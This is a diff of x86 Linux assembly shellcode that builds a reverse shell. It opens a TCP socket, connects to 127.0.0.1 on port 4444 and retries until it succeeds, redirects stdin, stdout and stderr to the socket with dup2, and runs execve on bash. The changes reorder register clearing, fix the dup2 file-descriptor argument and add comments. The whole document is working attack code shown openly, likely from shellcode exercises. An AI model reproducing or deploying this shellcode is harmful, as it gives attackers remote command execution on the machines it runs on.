@@ -16,33 +16,32 @@ tv_nsec dd 0 ; nanoseconds
 
 
 _start:
-; clean registers
-xor eax, eax
-xor ebx, ebx
-xor ecx, ecx
-xor edx, edx
 
+xor eax, eax
 mov al, 0x66 ; socketcall syscall
+
+xor ebx, ebx
 mov bl, 0x1  ; socket syscall
 
+xor ecx, ecx
 push ecx ; protocol : tcp
 push 0x1 ; socket type : SOCKET_STREAM
-push 0x2 ; domain : PF_INET
+push 0x2 ; domain : AF_INET
 
 mov  ecx, esp
-
 int 0x80 ; launch the syscall
 
-xor ecx, ecx
+xor edx, edx
 
 mov edx, eax ; mov socketfd from socket syscall return value in edx
 mov al, 0x66 ; socketcall syscall
 mov bl, 0x3  ; connect syscall
 
 ; sockaddr structure
-push 0x0100007F ; address
-push word 0x5C11 ; port
-push word 0x2 ; type
+xor ecx, ecx
+push 0x0100007F ; address : 127.0.0.1
+push word 0x5C11 ; port : 4444
+push word 0x2 ; type : AF_INET
 
 mov esi, esp ; save address of the sockaddr
 
@@ -51,7 +50,6 @@ push esi  ; address of sockaddr
 push edx  ; socketfd
 
 mov ecx, esp ; ecx point to the top of the stack
-
 int 0x80
 
 ; if the return code of eax is not null, nc is not lauch, so we need to wait and go back to the begining of the code
@@ -76,24 +74,21 @@ jmp _start
 
 dupfd:
 mov al, 0x3F ; mov dup2 syscall to al for STDIN
-
+mov ebx, edx ; mov socketfd in ebx
 xor ecx, ecx
-xor ebx, ebx
-
 int 0x80
 
 mov al,0x3F ; mov dup2 syscall to al for STDOUT
 mov cl, 0x1
-
 int 0x80
 
 mov al, 0x3F ; mov dup2 syscall to al for STDERR
 mov cl, 0x2
-
 int 0x80
 
 mov al, 0xB ; execve syscall
 
+xor ebx, ebx
 push ebx        ; NULL
 push 0x68736162 ; hsab
 push 0x2F2F2F2F ; ////
@@ -103,5 +98,4 @@ mov ebx, esp
 
 xor ecx, ecx
 xor edx, edx
-
 int 0x80
